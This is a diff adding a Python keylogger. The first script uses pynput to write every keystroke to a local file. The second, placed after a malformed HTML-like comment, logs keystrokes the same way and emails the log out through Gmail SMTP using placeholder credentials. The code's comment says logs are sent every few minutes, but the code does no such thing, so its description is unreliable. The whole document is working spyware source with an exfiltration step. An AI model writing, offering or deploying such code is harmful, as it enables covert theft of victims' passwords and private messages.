@@ -1,0 +1,59 @@
+from pynput import keyboard
+
+log_file = "keystrokes.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as file:
+            file.write(f"{key.char}")  # Logs characters
+    except AttributeError:
+        with open(log_file, "a") as file:
+            file.write(f" {key} ")  # Logs special keys
+
+# Start listening to the keyboard
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+
+
+
+
+
+
+<!--- Sending logs VIA EMAIL ---!>
+
+import smtplib
+from email.message import EmailMessage
+from pynput import keyboard
+
+LOG_FILE = "keystrokes.txt"
+EMAIL_ADDRESS = "your_email@gmail.com"
+EMAIL_PASSWORD = "your_password"  # Use App Passwords for security!
+
+def send_email():
+    with open(LOG_FILE, "r") as file:
+        data = file.read()
+
+    msg = EmailMessage()
+    msg.set_content(data)
+    msg["Subject"] = "Keystroke Logs"
+    msg["From"] = EMAIL_ADDRESS
+    msg["To"] = EMAIL_ADDRESS  # Send to yourself or another test email
+
+    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
+        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+        server.send_message(msg)
+
+def on_press(key):
+    try:
+        with open(LOG_FILE, "a") as file:
+            file.write(f"{key.char}")
+    except AttributeError:
+        with open(LOG_FILE, "a") as file:
+            file.write(f" {key} ")
+
+# Automatically send logs every few minutes
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+    send_email()
+
+
